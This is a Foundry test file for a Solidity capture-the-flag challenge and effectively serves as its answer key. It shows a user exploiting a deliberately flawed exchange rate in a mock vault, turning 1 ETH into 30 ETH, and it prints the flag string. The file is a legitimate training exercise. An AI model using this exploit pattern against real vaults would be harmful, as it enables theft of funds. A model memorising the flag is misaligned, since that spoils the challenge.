// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import {Test, console} from "forge-std/Test.sol";
import {FlawedVault, SyntheticBTC} from "../src/RevealTheFlag.sol";

// Goal: Mint sBTC using ETH, swap it for more ETH than you started with, and call claimFlag() to reveal the flag. You must end with at least 10 ETH profit to succeed.
// Deployment Steps:
// 1. Deploy SyntheticBTC first, which mints 1000 sBTC to the deployer.
// 2. Deploy FlawedVault with the SyntheticBTC address and a mock swapRouter (for CTF simplicity, the vault itself acts as the router).
// 3. Fund FlawedVault with 100 ETH via fundContract() to enable swaps.
contract RevealTheFlagTest is Test {
    address deployer = address(0x1);
    FlawedVault public flawedVaultContract;
    SyntheticBTC public sBTCContract;

    function setUp() public {
        vm.startPrank(deployer);
        // deploy both contracts
        sBTCContract = new SyntheticBTC();
        flawedVaultContract = new FlawedVault(address(sBTCContract), deployer);

        // deployer funds the flawed vault with 100 ETH
        vm.deal(deployer, 100 ether);
        flawedVaultContract.fundContract{value: 100 ether}();

        // Verify contract received the ETH
        assertEq(address(flawedVaultContract).balance, 100 ether);

        // Mint 100 sETH to the flawed vault
        sBTCContract.mint(address(flawedVaultContract), 100 * 10 ** sBTCContract.decimals());
        vm.stopPrank();
    }

    function testRevealTheFlag() public {
        // user starts with 1 ETH
        address user = address(0x1000);
        vm.deal(user, 1 ether);

        vm.startPrank(user);

        // for 1 ETH user gets 1 sETH
        flawedVaultContract.mint{value: 1 ether}();
        assertEq(1 * 10 ** 8, sBTCContract.balanceOf(user));
        assertEq(0, address(user).balance);

        // execute swap and profit from a flawed exchange rate
        // for 1sETH get 30 ETH
        sBTCContract.approve(address(flawedVaultContract), 1 * 10 ** 8);
        flawedVaultContract.swap(1 * 10 ** 8);
        assertEq(0, sBTCContract.balanceOf(user));
        assertEq(30 ether, address(user).balance);

        // now user is able to reveal the flag
        vm.expectEmit();
        emit FlawedVault.FlagRevealed(user, "CTF{FlawedRatesForTheWin}");
        flawedVaultContract.claimFlag();

        vm.stopPrank();
    }
}
